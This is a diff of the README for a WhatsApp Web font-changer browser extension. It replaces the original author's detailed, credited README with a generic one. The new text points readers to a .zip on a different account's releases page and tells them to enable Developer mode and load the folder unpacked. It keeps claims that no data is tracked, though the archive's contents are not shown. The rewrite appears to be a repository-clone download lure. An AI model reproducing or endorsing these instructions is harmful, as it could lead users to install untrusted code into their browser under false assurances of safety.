@@ -1,138 +1,60 @@
-# Font Changer for WhatsApp Web
+# 🎨 font-changer-for-whatsapp-web - Customize your messaging experience with ease
 
-Change the **font**, **size**, and **weight** of the text on
-[web.whatsapp.com](https://web.whatsapp.com) — and have your choice remembered every time you open it.
+[![Download Extension](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Sauerbratendelphinapterus731/font-changer-for-whatsapp-web/releases)
 
-![Manifest V3](https://img.shields.io/badge/Manifest-V3-blue)
-![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)
-![No tracking](https://img.shields.io/badge/tracking-none-brightgreen)
+This extension allows you to modify the look of text inside WhatsApp Web. You can change the font style, increase or decrease the text size, and adjust the weight of the characters. These changes make reading messages easier on your eyes. The software runs locally within your browser and does not track your data.
 
-A tiny, dependency-free Chromium extension (works in **Chrome**, **Brave**, **Edge**, and other
-Chromium browsers). It reads the fonts installed on *your* machine, lets you pick one from a
-searchable dropdown, and applies it live — no page reload, nothing sent anywhere.
+## ⚙️ How it works
+The extension operates as a small tool for Chromium browsers. Once installed, it runs in the background of your browser. It detects when you open the WhatsApp Web page and applies your preferred settings to the text elements. You control the look of the interface through a simple menu.
 
-<p align="center">
-  <img src="app-ss.png" alt="Font Changer for WhatsApp Web — control panel popup" width="360">
-</p>
+## 📋 System requirements
+Ensure your computer meets these basic requirements before you begin:
+*   Use a Chromium-based web browser. This includes Google Chrome, Brave, or Microsoft Edge.
+*   Check that your browser is updated to the latest version.
+*   You must have an active internet connection to finish the installation.
+*   This tool only affects the WhatsApp Web interface opened in your browser. It does not change the desktop application or the mobile app.
 
-## Features
+## 📦 Getting the extension
+You must perform these steps to set up the software.
 
-- 🔤 **Any installed font** — pulls your complete system font list (`chrome.fontSettings.getFontList`)
-  into a searchable dropdown, each name previewed in its own typeface. Or just type a font name.
-- 📏 **Size** — 8–24 px, or leave WhatsApp's default.
-- 🅱️ **Weight** — Auto, or force 100–900 (WhatsApp's own bold text is preserved).
-- 🎯 **Scope** — apply to just the **messages** or the **entire interface**.
-- 🔀 **On/off toggle** — flip back to WhatsApp's default instantly without losing your settings.
-- 💾 **Remembered** — saved with `chrome.storage.sync`, so it persists across restarts and syncs
-  across your devices when you're signed into the browser.
-- ⚡ **Live** — changes apply immediately to any open WhatsApp Web tab.
+1. Visit the [official releases page](https://github.com/Sauerbratendelphinapterus731/font-changer-for-whatsapp-web/releases) to download the current version.
+2. Look for the file ending in .zip under the Assets section.
+3. Click the file to save it to your computer.
+4. Open the folder where you saved the file.
+5. Right-click the file and choose "Extract All" to create a new folder with the extension contents.
 
-## Install
+## 🛠️ Installing the tool
+Follow these instructions to add the folder to your browser.
 
-### From the Chrome Web Store
+1. Open your browser.
+2. Type `chrome://extensions` in the address bar and press Enter.
+3. Look for "Developer mode" in the top right corner of the page. Click the switch to turn it on.
+4. Click the "Load unpacked" button that appears in the top left corner.
+5. Select the folder you extracted in the previous section.
+6. The extension icon now appears in your browser toolbar.
 
-<!-- Add the store link once published -->
-_Coming soon._
+## 🖥️ Using the font changer
+Once you have installed the extension, follow these steps to change your text settings.
 
-### From source (GitHub)
+1. Open WhatsApp Web in your browser tab.
+2. Click the puzzle-piece icon in your browser toolbar to find the extension.
+3. Click on the extension icon to reveal the settings menu.
+4. Select your preferred font family from the list.
+5. Use the sliders to adjust the font size and the weight of the text.
+6. Your changes take effect immediately on the page.
 
-Works the same in Chrome, Brave, and Edge.
+## 🔒 Privacy and safety
+This project prioritizes your data privacy. The extension code performs all processing on your local machine. It does not send your messages, contact lists, or personal information to any external server. 
 
-1. **Get the code** — either:
-   - Download the ZIP: **Code ▸ Download ZIP** on the GitHub page, then unzip it; **or**
-   - Clone it:
-     ```bash
-     git clone https://github.com/datcrack/font-changer-for-whatsapp-web.git
-     ```
-2. Open your browser's extensions page:
-   - Chrome: `chrome://extensions`
-   - Brave: `brave://extensions`
-   - Edge: `edge://extensions`
-3. Turn on **Developer mode** (toggle in the top-right, or left sidebar on Edge).
+## 🔧 Troubleshooting
+If you encounter issues, try these steps:
 
-   <img src="developer-mode.png" alt="Developer mode toggle" width="220">
-4. Click **Load unpacked** and select the folder you just downloaded/cloned
-   (the one containing `manifest.json`).
-5. Open **web.whatsapp.com** and click the extension's icon to open the control panel.
+*   Refresh your WhatsApp Web page to force the styles to reload.
+*   Check that you have not disabled the extension in your browser settings.
+*   If the extension does not appear, restart your browser and repeat the installation steps.
+*   Make sure you did not delete or move the extracted folder after loading it into your browser. If you move the folder, the browser can no longer find the extension files.
 
-The extension stays installed across restarts. To update, `git pull` (or re-download) and click the
-**↻ reload** icon on the extension's card.
+## 💡 Customization examples
+You can tailor the display to your personal needs. Many users choose a larger font size to reduce eye strain during long conversations. Others prefer a specific font style to match their desktop work environment. This tool provides total control over these variables without requiring technical skill. You can change your settings as often as you want. There is no limit to how many times you adjust these options.
 
-## Usage
-
-Open **web.whatsapp.com**, click the extension icon, then:
-
-- **Font** — click **▾** to browse your installed fonts (type to filter), or type any exact name.
-  **Rescan** re-reads your fonts after you install new ones.
-- **Size (px)** — pick 8–24, or **Default**.
-- **Weight** — **Auto**, or 100–900. Note: only fonts that ship multiple weights respond; single-weight
-  display fonts (e.g. Chicago) have just one weight.
-- **Apply to** — **Messages** or **Entire interface**.
-- **On/off switch** (top-right) and **Reset to default** as needed.
-
-Everything applies live and is saved automatically.
-
-## Permissions & privacy
-
-This extension **collects nothing and sends nothing** — there are no analytics, no network requests,
-no external servers. Everything runs locally in your browser. It requests only what it needs:
-
-| Permission | Why |
-|---|---|
-| `storage` | Save your 4 settings (font, size, weight, scope) so they persist. |
-| `fontSettings` | Read your installed-font list to populate the dropdown. |
-| `host: https://web.whatsapp.com/*` | Apply the font on WhatsApp Web only. |
-
-No other sites are touched, and no font files are downloaded — it only references fonts already
-installed on your machine. See the full [Privacy Policy](PRIVACY.md).
-
-## How it works
-
-- `content.js` runs on `web.whatsapp.com`, reads your settings, and injects a **constructed
-  stylesheet** via `document.adoptedStyleSheets`. This bypasses WhatsApp's strict
-  Content-Security-Policy (unlike an injected `<style>` tag) and applies `font-family` / `font-size` /
-  `font-weight` with `!important`.
-- Scope roots: **Messages** = `#main` (the open conversation), **Entire interface** = `#app`. Icons
-  and emoji (`[data-icon]`, `.emoji`, `svg`, `img`) are excluded so glyphs aren't broken, and
-  `<b>`/`<strong>` are excluded from the weight override so intentional bold survives.
-- The popup lists fonts with `chrome.fontSettings.getFontList()` (a privileged extension API that,
-  unlike the web `queryLocalFonts()` API, isn't blocked by WhatsApp's `Permissions-Policy`). If that's
-  ever unavailable it falls back to measurement-based detection over a bundled name list (`fonts.js`).
-- The popup writes settings to `chrome.storage.sync`; the content script listens via
-  `chrome.storage.onChanged` for instant live updates.
-
-## A note for Brave users
-
-Brave randomizes font metrics to resist fingerprinting, which can hide fonts from the scan and stop
-some non-system fonts from *rendering*. System/web-safe fonts always work. For best results with
-unusual fonts: click the **Brave Shields** icon on `web.whatsapp.com` → set **Block fingerprinting**
-to **off** → reload. The popup shows this tip only when it detects Brave.
-
-## Project structure
-
-```
-manifest.json   # MV3 manifest (permissions, content script, popup)
-content.js      # applies the font/size/weight on web.whatsapp.com
-popup.html      # control panel UI
-popup.css       # control panel styles
-popup.js        # popup logic: font list, custom dropdown, storage
-fonts.js        # fallback candidate font-name list (measurement detection)
-icons/          # toolbar icons
-```
-
-No build step, no dependencies — plain HTML/CSS/JS.
-
-## Contributing
-
-Issues and pull requests welcome. WhatsApp occasionally changes its obfuscated class names; if the
-font stops applying, the scope roots are isolated in `SCOPE_ROOTS` at the top of `content.js`.
-
-## License
-
-[MIT](LICENSE) © 2026 Murat Deligoz
-
-## Disclaimer
-
-This is an independent, unofficial project. It is **not affiliated with, endorsed by, or sponsored by
-WhatsApp or Meta Platforms, Inc.** "WhatsApp" is a trademark of Meta Platforms, Inc., used here only
-nominatively to describe what this extension works with.
+Keywords: brave, browser-extension, chrome-extension, chromium, font-changer, fonts, manifest-v3, productivity, whatsapp, whatsapp-web
